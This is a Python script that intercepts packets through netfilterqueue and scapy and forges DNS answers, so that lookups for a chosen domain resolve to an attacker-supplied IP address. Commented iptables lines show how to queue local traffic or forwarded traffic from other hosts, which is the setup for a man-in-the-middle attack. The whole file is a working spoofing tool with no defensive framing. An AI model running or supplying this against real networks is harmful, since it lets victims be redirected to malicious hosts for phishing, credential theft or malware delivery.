#! /usr/bin/env python

import subprocess
import netfilterqueue
import argparse
import scapy.all as scapy

def getArg():
    parser = argparse.ArgumentParser()
    parser.add_argument("-q", "--queue-number", type=int, required=True, dest="queueNumber", metavar="",
                        help="[?] Number of queue")
    parser.add_argument("-cn", "--changeable-name", required=True, dest="cName", metavar="",
                        help="[?] Url which need to change")
    parser.add_argument("-ri", "--redirected-ip", required=True, dest="rIp", metavar="",
                        help="[?] IP to which redirection takes place")
    return parser.parse_args()


def packetProces(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNS) or scapy_packet.haslayer(scapy.DNSRR):

        requestName = scapy_packet[scapy.DNSQR].qname

        print(f"---> {requestName}")
        if getArg().cName.encode() in requestName:
            print(f"[+] Spoofing {requestName}")
            answer = scapy.DNSRR(rrname=requestName, rdata=getArg().rIp)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()
    #packet.drop()


def netCut():
    # subprocess.call([f"iptables -I OUTPUT -j NFQUEUE --queue-num {getArg().queueNumber}"])  # for my obj(self-test)
    # subprocess.call([f"iptables -I INPUT -j NFQUEUE --queue-num {getArg().queueNumber}"])  # for my obj(self-test)
    # subprocess.call([f"iptables -I FORWARD -j NFQUEUE --queue-num {getArg().queueNumber}"]) # for other obj
    print(f"Im here, {getArg().queueNumber}")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(getArg().queueNumber, packetProces)
    queue.run()

if __name__ == '__main__':
    try:
        netCut()
    except KeyboardInterrupt:
        subprocess.call(["iptables", "--flush"])
        print("\nDetected Ctrl + C")
        exit()



